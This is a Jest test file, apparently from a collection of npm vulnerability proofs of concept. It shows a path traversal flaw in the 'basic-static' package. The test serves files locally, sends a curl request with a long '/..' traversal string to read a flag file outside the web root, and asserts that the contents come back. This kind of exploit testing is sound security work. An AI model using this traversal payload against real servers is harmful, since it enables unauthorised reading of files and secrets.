//https://github.com/JacksonGL/NPM-Vuln-PoC/blob/master/package.json
const path = require("path");
const pathToFlag = path.resolve(__dirname, "../flag.html");

function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}

test("Path Traversal in basic-static", (done) => {
  const basicStatic = require("basic-static");
  const serveStatic = basicStatic({ rootDir: process.cwd(), compress: true });
  const http = require("http");
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();

  const server = http.createServer(function (req, res) {
    serveStatic(req, res);
  });

  server.listen(8999);

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8999${genstr()}"`;

  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
